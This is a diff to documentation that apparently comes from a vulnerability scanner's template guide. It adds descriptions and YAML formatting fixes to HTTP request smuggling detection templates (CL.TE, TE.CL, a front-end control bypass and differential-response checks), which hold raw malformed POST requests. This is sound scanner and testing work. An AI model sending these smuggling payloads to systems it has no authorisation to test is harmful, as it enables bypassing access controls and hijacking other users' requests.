@@ -1,5 +1,7 @@
 ### Basic CL.TE
 
+This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response.
+
 ```yaml
 id: CL.TE-http-smuggling
 
@@ -11,7 +13,7 @@ info:
 
 requests:
   - raw:
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Connection: keep-alive
@@ -22,7 +24,7 @@ requests:
       0
       
       G
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Connection: keep-alive
@@ -43,6 +45,9 @@ requests:
 
 ### Basic TE.CL
 
+This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response.
+
+
 ```yaml
 id: TE.CL-http-smuggling
 
@@ -54,7 +59,7 @@ info:
 
 requests:
   - raw:
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -68,7 +73,7 @@ requests:
       
       x=1
       0
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -92,7 +97,10 @@ requests:
 
 ### Frontend bypass CL.TE
 
-```
+This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response.
+
+
+```yaml
 id: smuggling-bypass-front-end-controls-cl-te
 
 info:
@@ -103,7 +111,7 @@ info:
 
 requests:
   - raw:
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -118,7 +126,7 @@ requests:
       Content-Length: 10
       
       x=
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -143,6 +151,9 @@ requests:
 
 ### Differential responses based CL.TE
 
+This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response.
+
+
 ```yaml
 id: confirming-cl-te-via-differential-responses-http-smuggling
 
@@ -154,7 +165,7 @@ info:
 
 requests:
   - raw:
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -165,7 +176,7 @@ requests:
       
       GET /404 HTTP/1.1
       X-Ignore: X
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -186,6 +197,9 @@ requests:
 
 ### Differential responses based TE.CL
 
+This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response.
+
+
 ```yaml
 id: confirming-te-cl-via-differential-responses-http-smuggling
 
@@ -197,7 +211,7 @@ info:
 
 requests:
   - raw:
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
@@ -211,7 +225,7 @@ requests:
       
       x=1
       0
-    - |
+    - |+
       POST / HTTP/1.1
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
